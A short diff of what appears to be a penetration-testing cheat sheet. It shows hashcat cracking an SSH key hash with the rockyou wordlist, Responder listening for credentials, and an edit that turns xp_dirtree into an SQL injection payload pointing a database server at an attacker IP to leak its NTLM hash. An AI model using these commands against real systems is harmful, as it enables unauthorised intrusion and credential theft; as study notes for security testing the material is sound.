@@ -484,7 +484,7 @@ kali@kali: hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force
 
 or
 sudo Responder -I tun0 -A
-xp_dirtree \\192.168.45.176\share
+';EXEC xp_dirtree \\192.168.45.176\share
 ```
 
 ## postgresql
